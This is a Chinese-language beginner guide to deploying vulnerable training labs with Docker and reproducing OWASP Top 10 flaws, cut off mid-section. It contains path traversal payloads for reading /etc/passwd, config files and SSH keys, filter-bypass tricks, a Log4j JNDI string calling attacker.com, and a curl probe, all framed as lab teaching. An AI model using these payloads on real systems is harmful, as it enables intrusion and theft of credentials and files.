# OWASP Top 10 - Docker 一键部署学习指南

> 适合零基础新手的快速入门方案

---

## 为什么选 Docker 一键部署？

- ✅ **零基础友好**：只需一条命令就能启动
- ✅ **快速部署**：5分钟内完成所有环境搭建
- ✅ **资源占用小**：相比虚拟机节省90%空间（仅需500MB-2GB）
- ✅ **易于切换**：可以同时运行多个靶场
- ✅ **易于清理**：一键删除所有环境
- ✅ **跨平台支持**：Windows、macOS、Linux 均可使用

---

## 学习环境总览

| 应用 | 容器端口 | 主机端口 | 访问地址 | 用途 |
|------|---------|---------|---------|------|
| WebGoat | 8080 | 8080 | http://localhost:8080/WebGoat | OWASP官方教学平台 |
| DVWA | 80 | 8081 | http://localhost:8081 | Web漏洞基础靶场 |
| OWASP Juice Shop | 3000 | 8082 | http://localhost:8082 | 现代Web漏洞靶场 |
| SQLi-Labs | 80 | 8083 | http://localhost:8083 | SQL注入专项靶场 |

---

## 第一步：安装 Docker

### Windows 用户（10分钟）

1. **下载 Docker Desktop**
   - 访问：https://www.docker.com/products/docker-desktop
   - 下载 Windows 版本

2. **安装**
   - 双击安装程序
   - 一路点击"Next"
   - 完成后重启电脑

3. **验证安装**
   - 任务栏看到 Docker 图标
   - 图标显示"Running"表示安装成功

### macOS 用户（10分钟）

1. **下载 Docker Desktop**
   - 访问：https://www.docker.com/products/docker-desktop
   - 下载 Mac 版本（Intel 或 Apple Silicon）

2. **安装**
   - 双击 .dmg 文件
   - 拖拽到 Applications 文件夹

3. **启动**
   - 打开 Docker Desktop
   - 菜单栏看到 Docker 图标即安装成功

### Linux 用户（5分钟）

```bash
# Ubuntu/Debian/Kali
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker

# 将当前用户加入 docker 组（避免每次用 sudo）
sudo usermod -aG docker $USER
newgrp docker

# 验证安装
docker --version
docker run hello-world
```

---

## 第二步：配置国内镜像加速（强烈推荐）

⚠️ **重要性**：配置镜像加速后，下载速度可提升10倍以上（从几小时缩短到几分钟）

### Windows/Mac（Docker Desktop）

1. 右键任务栏 Docker 图标 → **"Settings"**
2. 选择左侧 **"Docker Engine"**
3. 在配置中添加：

```json
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://docker.mirrors.ustc.edu.cn",
    "https://docker.nju.edu.cn"
  ]
}
```

4. 点击 **"Apply & Restart"**
5. 等待 Docker 重启（约1-2分钟）

### Linux（Ubuntu/Debian/Kali）

```bash
# 创建 Docker 配置目录
sudo mkdir -p /etc/docker

# 配置镜像加速
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://docker.mirrors.ustc.edu.cn",
    "https://docker.nju.edu.cn"
  ]
}
EOF

# 重启 Docker 服务
sudo systemctl daemon-reload
sudo systemctl restart docker

# 验证配置
docker info | grep -A 10 "Registry Mirrors"
```

---

## 第三步：部署靶场环境

### 靶场1：DVWA（Web漏洞基础靶场）

**特点**：包含SQL注入、XSS、文件上传等10多种常见漏洞，适合新手入门

#### 部署步骤（3分钟）

```bash
# 1. 拉取 DVWA 镜像
docker pull vulnerables/web-dvwa

# 2. 启动 DVWA 容器
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa

# 3. 查看容器状态
docker ps
```

#### 参数说明

- `-d`：后台运行（detach）
- `-p 8081:80`：端口映射（主机8081端口 → 容器80端口）
- `--name dvwa`：给容器取名 dvwa
- `vulnerables/web-dvwa`：镜像名称

#### 初始化配置（2分钟）

1. 打开浏览器，访问：**http://localhost:8081**
2. 使用默认账号登录：
   - 用户名：`admin`
   - 密码：`password`
3. 登录后会提示配置数据库
4. 点击页面底部的 **"Create / Reset Database"** 按钮
5. 等待几秒钟，自动跳转到主页

#### 设置安全等级

1. 点击左侧菜单的 **"DVWA Security"**
2. 选择安全等级：
   - **Low**：无防护，适合新手学习漏洞原理
   - **Medium**：基础防护，需要绕过技巧
   - **High**：高级防护，深入理解漏洞
   - **Impossible**：完全防护，学习防御机制
3. 点击 **"Submit"** 保存

---

### 靶场2：WebGoat（OWASP官方教学平台）

**特点**：OWASP官方出品，包含详细的教学内容和练习题

#### 部署步骤

```bash
# 1. 拉取 WebGoat 镜像
docker pull webgoat/webgoat

# 2. 启动 WebGoat 容器（仅本机访问）
docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 --name webgoat webgoat/webgoat
```

#### 访问

- 打开浏览器，访问：**http://localhost:8080/WebGoat**
- 默认账号：`guest` / `guest`

⚠️ **注意**：WebGoat 使用 `127.0.0.1` 绑定，只能从本机访问。如果需要远程访问，移除 `127.0.0.1:` 即可。

---

### 靶场3：OWASP Juice Shop（现代Web漏洞靶场）

**特点**：包含现代Web应用的所有常见漏洞，界面美观，难度渐进

#### 部署步骤

```bash
# 1. 拉取 Juice Shop 镜像
docker pull bkimminich/juice-shop

# 2. 启动 Juice Shop 容器
docker run -d -p 8082:3000 --name juice-shop bkimminich/juice-shop
```

#### 访问

- 打开浏览器，访问：**http://localhost:8082**
- 无需登录，直接开始练习

---

### 靶场4：SQLi-Labs（SQL注入专项靶场）

**特点**：专门练习SQL注入，包含从基础到高级的所有SQL注入类型

#### 部署步骤

```bash
# 1. 拉取 SQLi-Labs 镜像
docker pull acgpiano/sqli-labs

# 2. 启动 SQLi-Labs 容器
docker run -d -p 8083:80 --name sqli-labs acgpiano/sqli-labs
```

#### 访问

- 打开浏览器，访问：**http://localhost:8083**
- 点击页面上的 "Setup/reset Database" 初始化数据库

---

## 第四步：一键启动所有靶场（推荐）

如果你已经拉取了所有镜像，可以使用这个脚本一键启动所有靶场：

```bash
cat > start_all_targets.sh << 'EOF'
#!/bin/bash

echo "=== 启动所有漏洞环境 ==="
echo ""

# 1. DVWA (端口 8081)
echo "【1】启动 DVWA (端口 8081)..."
docker run -d \
  --name dvwa \
  -p 8081:80 \
  vulnerables/web-dvwa

# 2. WebGoat (端口 8080)
echo "【2】启动 WebGoat (端口 8080)..."
docker run -d \
  --name webgoat \
  -p 127.0.0.1:8080:8080 \
  -p 127.0.0.1:9090:9090 \
  webgoat/webgoat

# 3. OWASP Juice Shop (端口 8082)
echo "【3】启动 OWASP Juice Shop (端口 8082)..."
docker run -d \
  --name juice-shop \
  -p 8082:3000 \
  bkimminich/juice-shop

# 4. SQLi-Labs (端口 8083)
echo "【4】启动 SQLi-Labs (端口 8083)..."
docker run -d \
  --name sqli-labs \
  -p 8083:80 \
  acgpiano/sqli-labs

echo ""
echo "=== 启动完成！==="
echo ""
echo "访问地址："
echo "  WebGoat:      http://localhost:8080/WebGoat"
echo "  DVWA:         http://localhost:8081"
echo "  OWASP Juice Shop: http://localhost:8082"
echo "  SQLi-Labs:    http://localhost:8083"
echo ""
echo "查看运行状态：docker ps"
EOF

chmod +x start_all_targets.sh
./start_all_targets.sh
```

---

## Docker 常用管理命令

### 容器管理

```bash
# 查看运行中的容器
docker ps

# 查看所有容器（包括停止的）
docker ps -a

# 停止容器
docker stop dvwa

# 启动容器
docker start dvwa

# 重启容器
docker restart dvwa

# 删除容器
docker rm dvwa

# 强制删除运行中的容器
docker rm -f dvwa
```

### 镜像管理

```bash
# 查看本地镜像
docker images

# 拉取镜像
docker pull vulnerables/web-dvwa

# 删除镜像
docker rmi vulnerables/web-dvwa

# 清理未使用的镜像
docker image prune -a
```

### 日志与调试

```bash
# 查看容器日志
docker logs dvwa

# 查看实时日志
docker logs -f dvwa

# 查看最后100行日志
docker logs --tail 100 dvwa

# 进入容器内部
docker exec -it dvwa /bin/bash

# 退出容器
exit
```

### 批量操作

```bash
# 停止所有容器
docker stop $(docker ps -q)

# 删除所有容器
docker rm $(docker ps -aq)

# 停止并删除所有靶场容器
docker stop webgoat dvwa juice-shop sqli-labs 2>/dev/null
docker rm webgoat dvwa juice-shop sqli-labs 2>/dev/null
```

---

## 一键查看所有靶场地址

```bash
cat > show_targets.sh << 'EOF'
#!/bin/bash

echo "=== 漏洞靶场访问地址 ==="
echo ""

echo "【OWASP 系列】"
echo "  WebGoat:      http://localhost:8080/WebGoat"
echo "  DVWA:         http://localhost:8081"
echo "  Juice Shop:   http://localhost:8082"

echo ""
echo "【SQL注入靶场】"
echo "  SQLi-Labs:    http://localhost:8083"

echo ""
echo "【运行中的容器】"
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

echo ""
echo "查看详情：docker ps"
echo "停止容器：docker stop <容器名>"
EOF

chmod +x show_targets.sh
./show_targets.sh
```

---

## 常见问题解决

### 问题1：权限不足（Linux）

**错误信息**：
```
Got permission denied while trying to connect to the Docker daemon socket
```

**解决方法**：
```bash
# 将用户加入 docker 组
sudo usermod -aG docker $USER
newgrp docker  # 立即生效，或重新登录
```

---

### 问题2：端口冲突

**错误信息**：
```
Error starting userland proxy: listen tcp4 0.0.0.0:8080: bind: address already in use
```

**解决方法**：
```bash
# 方法1：查看端口占用
sudo netstat -tulnp | grep 8080  # Linux
netstat -ano | findstr :8080    # Windows

# 方法2：使用不同的端口
docker run -d -p 8081:80 --name dvwa vulnerables/web-dvwa
```

---

### 问题3：镜像下载慢或超时

**错误信息**：
```
Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled
```

**解决方法**：
1. 配置国内镜像加速（见第二步）
2. 检查网络连接
3. 重启 Docker 服务

---

### 问题4：容器启动失败

**解决方法**：
```bash
# 查看详细错误日志
docker logs dvwa

# 常见原因：
# - 端口被占用
# - 资源不足
# - 镜像损坏
```

---

### 问题5：WebGoat 无法从局域网访问

**原因**：WebGoat 默认绑定到 `127.0.0.1`，只能本机访问

**解决方法**：
```bash
# 停止并删除旧容器
docker stop webgoat
docker rm webgoat

# 重新启动（不绑定 127.0.0.1）
docker run -d -p 8080:8080 -p 9090:9090 --name webgoat webgoat/webgoat
```

---

### 问题6：Docker 服务未启动（Linux）

**错误信息**：
```
Cannot connect to the Docker daemon
```

**解决方法**：
```bash
# 启动 Docker 服务
sudo systemctl start docker

# 设置开机自启
sudo systemctl enable docker

# 检查状态
sudo systemctl status docker
```

---

## 学习路径建议

### 第一阶段：熟悉环境（1天）

1. 成功部署所有靶场
2. 熟悉 Docker 基本命令
3. 浏览各靶场的主页和功能

### 第二阶段：DVWA 基础练习（1-2周）

按照以下顺序学习：
1. **Brute Force**（暴力破解）
2. **Command Injection**（命令注入）
3. **CSRF**（跨站请求伪造）
4. **File Inclusion**（文件包含）
5. **File Upload**（文件上传）
6. **SQL Injection**（SQL注入）
7. **SQL Injection (Blind)**（盲注）
8. **XSS (Reflected)**（反射型XSS）
9. **XSS (Stored)**（存储型XSS）
10. **XSS (DOM)**（DOM型XSS）

**学习建议**：
- 从 Low 级别开始，理解漏洞原理
- 逐步挑战 Medium 和 High 级别
- 对比不同级别的防护差异
- 查看 Impossible 级别了解防御方法

### 第三阶段：WebGoat 深入学习（2-4周）

WebGoat 提供更详细的教学内容：
1. 按照课程顺序学习
2. 完成每个练习
3. 阅读教学材料
4. 理解漏洞的原理和防御

### 第四阶段：Juice Shop 现代应用（2-3周）

Juice Shop 是现代化的单页应用（SPA）：
1. 尝试自动化工具（如 OWASP ZAP）
2. 学习 JavaScript 安全
3. 练习自动化渗透测试

### 第五阶段：SQLi-Labs 专项训练（1-2周）

专门深入 SQL 注入：
1. 系统学习所有 SQL 注入类型
2. 手工注入和自动化工具结合
3. 掌握绕过技巧

---

## 第五部分：OWASP Top 10 漏洞详细复现

> 本章将带你深入理解OWASP Top 10中最重要的漏洞，包含原理讲解、真实案例和完整复现步骤

### ⚠️ 法律声明

> **重要提示**：以下所有复现操作必须在**授权的靶场环境**中进行！
>
> 未经许可对真实系统进行渗透测试，将违反《中华人民共和国网络安全法》第27条、第63条，以及《刑法》第285条、第286条，可能面临刑事处罚。
>
> **仅限学习目的，严禁用于非法用途！**

---

### A01:2025 失效的访问控制

#### 1.1 漏洞原理（生活化例子）

**类比**：想象你住在一个小区，每个住户都有门禁卡，只能进自己的楼栋。但是如果门禁系统坏了，你的卡不仅能进自己楼栋，还能进别人楼栋，这就是"访问控制失效"。

**技术原理**：Web 应用程序没有正确验证用户是否有权限访问某个资源。攻击者可以通过修改 URL 参数、Cookie 或隐藏字段，访问不应该访问的数据或功能。

**常见类型**：
- **水平越权**：访问同级用户的数据（如查看他人订单）
- **垂直越权**：普通用户访问管理员功能
- **IDOR**（不安全的直接对象引用）

#### 1.2 真实案例

**案例**：2024年某银行APP漏洞

- **事件**：用户发现修改订单ID可以查看他人订单信息
- **原因**：后端未验证订单归属
- **影响**：数万用户财务信息泄露
- **修复**：增加订单归属校验

#### 1.3 DVWA 复现（完整步骤）

**步骤1：启动DVWA环境**

```bash
# 启动DVWA容器
docker start dvwa

# 访问
# http://localhost:8081
```

**步骤2：登录DVWA**

1. 访问：http://localhost:8081
2. 登录：admin/password
3. 设置安全等级为 **Low**

**步骤3：测试水平越权（目录遍历）**

**3.1 界面识别（重要！）**

DVWA的目录遍历功能包含在 **"File Inclusion"** 模块中，不是独立的"Directory Traversal"菜单项。

**界面特征**：
- 页面标题：`Vulnerability: File Inclusion`
- 显示内容：`Hello admin` 和你的IP地址
- 有 `[back]` 链接
- 有 `View Source` 和 `View Help` 按钮
- **没有**下拉框和Include按钮（通过URL参数控制）

**3.2 完整复现步骤（保姆级教程）**

**步骤A：确保DVWA已初始化并登录**

1. ✅ 确保已经点击了"Create / Reset Database"按钮完成初始化
2. ✅ 使用 `admin` / `password` 登录成功
3. ✅ 看到DVWA主界面（左侧有菜单列表）

**步骤B：设置安全等级为Low（必须！）**

1. 点击左侧菜单中的 **"DVWA Security"**
2. 在安全等级下拉框中选择 **"low"**
3. 点击页面底部的 **"Submit"** 按钮
4. **确认成功**：页面顶部显示绿色文字 `DVWA Security level set to low`

**为什么必须设置Low？**
- 不同安全等级有不同的防护措施
- Low等级没有任何过滤，最容易复现成功
- Medium等级会过滤 `../` 字符
- High等级有更复杂的防护机制

**步骤C：进入File Inclusion模块**

1. 点击左侧菜单中的 **"File Inclusion"**
   - 菜单位置：左侧导航栏中间区域
   - 在"Brute Force"和"File Upload"之间

2. **你会看到**：
   - 页面标题：`File Inclusion`
   - 页面显示内容：`Hello admin` 和你的IP地址
   - 当前URL应该是：`http://localhost:8081/vulnerabilities/fi/?page=file1.php`

**步骤D：理解正常操作（先看清楚）**

1. 修改URL中的 `page` 参数：
   - 将 `file1.php` 改为 `file2.php`
   - 或改为 `file3.php`
2. 按回车访问
3. **观察结果**：页面显示不同的内容

**理解原理**：
- DVWA通过URL中的 `page` 参数决定显示什么内容
- 当 `page=file1.php` 时，显示File 1的内容
- 当 `page=file2.php` 时，显示File 2的内容
- 系统使用PHP的 `include()` 函数包含并显示文件
- **问题在于**：系统没有检查 `page` 参数的值是否合法，可以传入任意路径！

**步骤E：开始攻击 - 读取系统文件（核心步骤）**

**目标**：读取Linux系统的用户信息文件 `/etc/passwd`

**方法：直接修改URL**

1. **在浏览器地址栏中找到当前URL**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=file1.php
   ```

2. **将URL末尾的 `file1.php` 替换为**：
   ```
   ../../../../etc/passwd
   ```

3. **完整的URL变成**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/passwd
   ```

4. **按回车键访问这个URL**

5. **观察结果（成功标志）**：
   页面会显示类似这样的内容：
   ```
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   sync:x:4:65534:sync:/bin:/bin/sync
   ...
   ```

   **这是Linux系统中的用户账号文件！攻击成功了！**

**步骤F：尝试更多文件（扩展练习）**

**试试读取其他系统文件**：

1. **读取主机名配置**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/hosts
   ```

2. **读取hosts文件**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/hosts
   ```

3. **读取Apache配置**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/apache2/apache2.conf
   ```

4. **读取PHP配置**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=../../../../etc/php/7.0/apache2/php.ini
   ```

5. **读取DVWA配置文件（重要！）**：
   ```
   http://localhost:8081/vulnerabilities/fi/?page=../../../../var/www/html/config/config.inc.php
   ```
   **这个文件包含数据库密码！**

**步骤G：如何确认复现成功？**

✅ **成功标志**：
- 页面显示了系统文件内容（如 `/etc/passwd`）
- 看到了用户列表、路径等敏感信息
- URL被成功修改为包含 `../` 的形式

❌ **失败标志**：
- 页面显示空白
- 页面显示错误信息
- 页面显示"File not found"
- URL自动跳转回默认值

**步骤H：使用Burp Suite抓包测试（进阶）**

**准备工作**：
1. 打开Burp Suite
2. 设置浏览器代理为 `127.0.0.1:8080`
3. 开启Proxy的Intercept（拦截模式）

**抓包步骤**：

1. 在浏览器访问File Inclusion页面
2. 修改URL：`?page=file1.php`
3. 按回车访问
4. 请求被Burp拦截

5. **查看拦截的请求**：
   ```
   GET /vulnerabilities/fi/?page=file1.php HTTP/1.1
   Host: localhost:8081
   ...
   ```

6. **修改参数**：
   将 `page=file1.php` 改为 `page=../../../../etc/passwd`

7. 点击 **Forward** 发送修改后的请求

8. 查看浏览器响应，应该看到 `/etc/passwd` 的内容

**3.3 原理分析**

```
正常查询：include.php?page=file1.php
执行结果：include("file1.php")
显示：File 1 的内容（Hello admin）

恶意查询：include.php?page=../../../../etc/passwd
执行结果：include("../../../../etc/passwd")
显示：/etc/passwd 的内容（系统用户信息）
```

#### 3.4 攻击Payload（../ 路径遍历）原理深度解析

**3.4.1 核心原理：操作系统的路径表示**

在Unix/Linux系统中，目录结构的表示方式：

**绝对路径**（从根目录开始）：
```
/var/www/html/index.php
```

**相对路径**（从当前目录开始）：
```
./index.html  或 index.html
```

**特殊路径符号**：

| 符号 | 含义 | 作用 |
|------|------|------|
| `.` | 当前目录 | 表示"我所在的地方" |
| `..` | 上一级目录 | 表示"父目录" |
| `/` | 目录分隔符 | 分隔各级目录 |

**3.4.2 路径遍历的工作机制**

假设Web应用的文件结构：
```
/
├── etc/
│   └── passwd          ← 我们的目标文件
├── var/
│   └── www/
│       └── html/
│           └── vulnerabilities/
│               └── fi/       ← 当前目录
│                   └── index.php
```

**当前工作目录**：
```
/var/www/html/vulnerabilities/fi/
```

**攻击目标**：
```
/etc/passwd
```

**路径计算过程**：

**Payload：** `../../../../etc/passwd`

**解析步骤**：
```
第1步：当前位置
/var/www/html/vulnerabilities/fi/

第2步：处理第一个 "../"
返回上一级 → /var/www/html/vulnerabilities/

第3步：处理第二个 "../"
返回上一级 → /var/www/html/

第4步：处理第三个 "../"
返回上一级 → /var/www/

第5步：处理第四个 "../"
返回上一级 → / (根目录)

第6步：处理第五个 "../"
已经在根目录，仍在 / (根目录)

第7步：处理第六个 "../"
已经在根目录，仍在 / (根目录)

第8步：处理 "etc"
进入 etc 目录 → /etc/

第9步：处理 "passwd"
定位到文件 → /etc/passwd
```

**路径计算公式**：
```
当前目录 + "../" × 6 + "etc/passwd"
= /var/www/html/vulnerabilities/fi/ + ↑↑↑↑↑↑ + etc/passwd
= /etc/passwd
```

**3.4.3 为什么多余的 "../" 不会报错？**

**在根目录使用 `..` 的行为**：
```
当前目录：/
执行：cd ..
结果：仍在 / (根目录)
```

**操作系统设计**：
- 根目录的"父目录"就是根目录本身
- 这是一种设计选择，避免程序崩溃
- 对攻击者来说，可以"安全地"使用过多的 `../`

**示例**：
```
../../../../../../etc/passwd
解析：
/ → / → / → / → / → / → / → /etc/passwd
      ^  ^  ^  ^  ^  ^
      │  │  │  │  │  └─ 在根目录，仍在 /
      │  │  │  │  └──── 在根目录，仍在 /
      │  │  │  └─────── 在根目录，仍在 /
      │  │  └────────── 到达根目录
      │  └───────────── 到达根目录
      └──────────────── 到达根目录
最终：/etc/passwd
```

**3.4.4 为什么Web应用会允许这种攻击？**

**有漏洞的代码示例**：
```php
<?php
// ❌ 危险的代码（DVWA Low等级）
$page = $_GET['page'];  // 获取用户输入
include($page);         // 直接包含文件，没有任何验证！
?>
```

**攻击过程模拟**：

**正常请求**：
```
URL: http://example.com/index.php?page=welcome.php
解析: include('/var/www/html/welcome.php')
结果: 显示 welcome.php 的内容 ✅
```

**攻击请求**：
```
URL: http://example.com/index.php?page=../../../../etc/passwd
解析: include('/var/www/html/../../../../etc/passwd')
     = include('/etc/passwd')
结果: 显示 /etc/passwd 的内容 ❌ 攻击成功！
```

**关键问题**：
1. **没有路径规范化**：PHP的 `include()` 函数直接使用用户输入，不会自动过滤 `../` 字符
2. **没有输入验证**：没有检查 `page` 参数是否只包含文件名
3. **服务器有读取权限**：Web服务器（www-data）有读取系统文件的权限

**3.4.5 常用Payload速查表**

| 目标 | Linux | Windows |
|------|-------|---------|
| 用户信息 | `../../../../etc/passwd` | `..\..\..\..\windows\system32\drivers\etc\hosts` |
| 主机配置 | `../../../../etc/hosts` | `..\..\..\..\windows\system32\drivers\etc\hosts` |
| 系统信息 | `../../../../etc/hostname` | 不适用 |
| Web配置 | `../../../../etc/apache2/apache2.conf` | `..\..\..\..\xampp\apache\conf\httpd.conf` |
| 数据库配置 | `../../../../var/www/html/config/db.php` | `..\..\..\..\xampp\htdocs\config\db.php` |
| 日志文件 | `../../../../var/log/apache2/access.log` | `..\..\..\..\xampp\apache\logs\access.log` |
| SSH密钥 | `../../../../home/user/.ssh/id_rsa` | 不适用 |

**3.4.6 编码绕过技巧**

**URL编码**：
```
正常：     ../etc/passwd
编码：     %2e%2e%2fetc%2fpasswd
双重编码：%252e%252e%252fetc%252fpasswd
```

**应用场景**：
- WAF（Web应用防火墙）过滤了 `../`
- 应用程序URL解码两次
- 特殊字符处理需求

**3.4.7 双写绕过**

**原理**：某些过滤只替换一次

```
正常：     ../etc/passwd
过滤：     ../ 被替换为空
结果：     etc/passwd (失败)

双写：     ....//etc/passwd
过滤1次：  ../ 被替换为空 → ../etc/passwd
结果：    成功！
```

**示例代码（有漏洞的过滤）**：
```php
// ❌ 只替换一次
$page = str_replace('../', '', $_GET['page']);

// 双写绕过
输入：   ....//etc/passwd
处理：   ./etc/passwd (第一个../被移除)
结果：   包含 ./etc/passwd，等价于 ../etc/passwd
```

**3.4.8 成功复现结果分析**

**攻击成功的URL**：
```
http://47.110.255.30:8081/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

**关键点解读**：

| 部分 | 含义 | 说明 |
|------|------|------|
| `47.110.255.30:8081` | 目标服务器 | 攻击的DVWA服务器IP和端口 |
| `/vulnerabilities/fi/` | 漏洞模块 | File Inclusion（文件包含）模块 |
| `?page=` | 参数名 | 控制包含哪个文件 |
| `../../../../../../etc/passwd` | 攻击载荷 | 路径遍历+目标文件 |

**/etc/passwd 文件内容分析**：

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

**每一行的含义（7个字段，用冒号分隔）**：

| 字段位置 | 字段名 | 示例 | 说明 |
|---------|--------|------|------|
| 1 | 用户名 | root | 登录系统的账号 |
| 2 | 密码 | x | 存储在 /etc/shadow（x表示加密存储） |
| 3 | 用户ID (UID) | 0 | 0=root，1-999=系统用户，1000+=普通用户 |
| 4 | 组ID (GID) | 0 | 用户所属的主组ID |
| 5 | 注释信息 | root | 用户的真实姓名或描述 |
| 6 | 家目录 | /root | 用户登录后的默认目录 |
| 7 | Shell | /bin/bash | 用户登录后执行的命令解释器 |

**步骤4：测试垂直越权**

1. 访问：`http://localhost:8081/vulnerabilities/auth_bypass/`
2. 看到"Authorized Access Only"提示
3. 尝试直接访问管理员页面：
   - `http://localhost:8081/vulnerabilities/auth_bypass/admin.php`
4. **成功**：直接进入管理员页面，无需认证！

**步骤5：Medium 难度测试**

1. 将安全等级改为 **Medium**
2. 重复上述测试
3. **失败**：系统过滤了 `../` 字符
4. 尝试绕过技巧：
   - **双写绕过**：`....//....//....//etc/passwd`
   - **URL编码绕过**：`%2e%2e%2f`（URL编码的`../`）
   - **大小写混淆**：`%2E%2E%2F`

#### 1.4 危害分析

| 危害类型 | 具体影响 |
|---------|---------|
| 信息泄露 | 访问他人敏感数据（订单、个人信息） |
| 权限提升 | 普通用户获得管理员权限 |
| 数据篡改 | 修改或删除他人数据 |
| 业务漏洞 | 绕过支付流程、获取免费服务 |
| 隐私侵犯 | 查看他人私密信息 |

#### 1.5 防御方法

**1. 服务端验证**

```php
// ❌ 错误做法：只信任客户端传来的 ID
$order_id = $_GET['order_id'];
$order = get_order($order_id);

// ✅ 正确做法：验证订单归属
$user_id = $_SESSION['user_id'];
$order_id = $_GET['order_id'];
$order = get_order($order_id, $user_id);  // 必须验证归属
```

**2. 使用不可预测的 ID**

- 使用 UUID 替代顺序 ID
- 例如：`/api/orders/a1b2c3d4` 代替 `/api/orders/123`

**3. 实施 RBAC（基于角色的访问控制）**

```python
# Python Flask 示例
@login_required
def admin_panel():
    if not current_user.has_role('admin'):
        abort(403)  # 无权限
    return render_template('admin.html')
```

**4. 日志审计**

- 记录所有访问操作
- 监控异常访问模式

**5. 默认拒绝原则**

```php
if (!has_permission($user, $resource)) {
    return 403;
}
```

---

### A02:2025 安全配置错误

#### 2.1 漏洞原理

**类比**：你家门钥匙插在门锁上没拔，等于邀请别人进来。

**技术原因**：
- 使用默认账号密码（admin/admin）
- 开启不必要的服务（目录浏览、DEBUG 模式）
- 错误信息泄露（显示堆栈跟踪）
- 配置文件未加密存储密钥
- CORS配置错误
- 暴露敏感文件（.git、.env、backup文件）

#### 2.2 真实案例：Nginx 目录穿越漏洞

**案例**：2025年某企业因 Nginx 配置错误导致服务器沦陷

**错误配置**：
```nginx
location /files {
    alias /home/;
}
```

**问题**：`alias` 末尾缺少斜杠，导致目录穿越漏洞

**攻击方式**：
```
访问：http://example.com/files../etc/passwd
实际访问：/home/../etc/passwd = /etc/passwd
```

#### 2.3 复现步骤

**步骤1：搭建测试环境**

```bash
# 拉取 Nginx 镜像
docker pull nginx:latest

# 创建测试目录
mkdir -p ~/nginx-test/files
echo "这是私有文件" > ~/nginx-test/files/secret.txt

# 运行 Nginx 容器
docker run -d \
  -p 8084:80 \
  -v ~/nginx-test/files:/usr/share/nginx/html/files:ro \
  --name nginx-test \
  nginx:latest
```

**步骤2：访问正常页面**

访问：http://localhost:8084/files/secret.txt
- 正常显示：`这是私有文件`

**步骤3：尝试目录穿越**

访问：http://localhost:8084/files../etc/passwd
- 如果成功，显示系统文件内容
- 如果失败，显示 404（现代 Nginx 已修复此问题）

**步骤4：查看 DVWA 配置文件**

```bash
# 进入 DVWA 容器
docker exec -it dvwa /bin/bash

# 查看配置文件（包含数据库密码）
cat /var/www/html/config.inc.php

# 退出容器
exit
```

#### 2.4 其他常见配置错误

| 错误类型 | 错误配置 | 正确配置 |
|---------|---------|---------|
| 默认密码 | admin/admin | 强制首次登录修改 |
| 目录浏览 | `autoindex on;` | `autoindex off;` |
| 错误信息 | 显示详细错误堆栈 | 显示通用错误页面 |
| DEBUG 模式 | `DEBUG = True` | `DEBUG = False` |
| 未加密传输 | HTTP | HTTPS 强制跳转 |
| 暴露敏感文件 | .git、.env | 在.gitignore中排除 |

#### 2.5 防御方法

**1. 安全基线检查**
- 使用 CIS Benchmarks 检查配置
- 使用自动化工具扫描（如 Lynis）

**2. 移除默认配置**
```nginx
server {
    listen 80 default_server;
    server_name _;
    return 444;  # 直接关闭连接
}
```

**3. 禁用不必要功能**
```nginx
autoindex off;           # 禁用目录浏览
server_tokens off;       # 隐藏版本号
```

**4. 最小权限原则**
- Web 服务使用非特权用户运行
- 限制文件访问权限
- 禁用不必要的扩展

---

### A03:2025 软件供应链故障

#### 3.1 漏洞原理

**类比**：你从餐厅点餐，餐厅的食材供应商被污染了，所有用这些食材的菜都有问题。

**技术原理**：
- 依赖的开源组件存在漏洞
- 第三方库被植入恶意代码
- CI/CD 流程被入侵
- 软件包签名被伪造

**典型案例**：
- Log4j2 漏洞（2021）- 影响全球数百万系统
- SolarWinds 攻击（2020）
- event-stream 事件（2018）

#### 3.2 真实案例：Log4j2 漏洞（CVE-2021-44228）

**时间线**：
- 2021年12月：漏洞公开
- 2022年：大规模攻击
- 2024年：仍有未修复的系统被攻击

**影响范围**：
- Apache Solr、Apache Struts2、Spring Boot
- Elasticsearch、Kafka
- 无数企业应用

**漏洞本质**：
```java
// 正常日志记录
logger.info("用户登录：{}", username);

// 恶意输入
username = "${jndi:ldap://attacker.com/Exploit}";

// 实际执行
logger.info("用户登录：${jndi:ldap://attacker.com/Exploit}");
// → 触发 JNDI 注入，加载恶意代码
```

#### 3.3 简化验证（使用DNSlog）

如果完整复现步骤太复杂，可以用DNSlog验证漏洞存在：

```bash
# 使用 DNSlog 平台（如 http://dnslog.cn/）
# 获取一个子域名：xxx.dnslog.cn

# 发送请求（假设有Log4j2漏洞的环境）
curl "http://target.com/solr/admin/cores?action=${jndi:dns://xxx.dnslog.cn}"

# 访问 DNSlog.cn 查看是否有 DNS 解析记录
# 如果有，说明漏洞存在
```

#### 3.4 危害分析

| 层面 | 危害 |
|------|------|
| 单系统 | 服务器被完全控制 |
| 内网 | 横向渗透，攻破整个网络 |
| 数据 | 敏感数据泄露、加密货币被窃取 |
| 供应链 | 依赖该组件的所有应用都受影响 |
| 业务 | 服务中断、经济损失 |

#### 3.5 防御方法

**1. 紧急修复**
```xml
<!-- pom.xml 中升级 Log4j2 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
